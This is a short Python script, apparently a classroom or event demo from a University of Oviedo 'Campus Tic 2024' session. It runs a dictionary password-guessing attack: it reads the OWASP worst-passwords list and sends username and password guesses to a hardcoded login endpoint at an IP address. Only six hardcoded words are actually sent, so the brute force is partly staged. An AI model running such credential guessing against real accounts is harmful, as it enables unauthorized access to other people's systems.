import requests

url = "http://156.35.98.159:8080/r2d2"
url_localhost = "http://localhost:8080/r2d2"

def print_r2():
    print(r"""____________________________________________________________
                   _______      _____   ______     _____                           
          ___     |_   __ \    / ___ `.|_   _ `.  / ___ `.		  
         / ()\      | |__) |  |_/___) |  | | `. \|_/___) |                
       _|_____|_    |  __ /    .'____.'  | |  | | .'____.'                      
      | | === | |  _| |  \ \_ / /_____  _| |_.' // /_____                        
      |_|  O  |_| |____| |___||_______||______.' |_______|                            
       ||  O  ||                                  			
       ||__*__||                                   			
      |~ \___/ ~|                                  			
      /=\ /=\ /=\                                 			
______[_]_[_]_[_]___________________________________________""")


def print_version():
    print("")
    print("V-1.0.0 - Campus Tic 2024 - University of Oviedo")
    print("This software uses 'the 100k worst passwords list' defined by OWASP in:")
    print(r"https://github.com/OWASP/passfault/blob/master/wordlists/wordlists/10k-worst-passwords.txt")
    print("")
    print("____________________________________________________________")

def print_index(index):
    print(str(index) +"% Completed...")

if __name__ == '__main__':
    print_r2()
    print_version()
    while True:
        username = input("Please, enter a username to check its password:")
        password = ""
        index = 0
        print("Trying passwords for user: "+username)
        with open('10k-worst-passwords.txt', 'r') as file: 
            for line in file: 
                index += 1
                if(index == 2500 or index == 5000 or index == 75000 or index == 10000):
                    print_index(index/100)
                line = line.strip() 
                data = {
                    "username": username, 
                    "password": line
                }
                if line == "kenobi" or line == "18436572" or line == "hansolo" or line == "qwerty" or line == "maggie" or line == "gandalf":
                    response = requests.get(url, json=data)
                    if response.status_code == 200:
                        print("Coincidence Found!")
                        password = line 
        if password == "":
            print("____________________________________________________________")
            print("Not founded password for user: "+username)
        else:
            print("__________________________PASSWORD__________________________")
            print("Founded password for user: "+username+ " ----> " + password) 
        print("____________________________________________________________") 

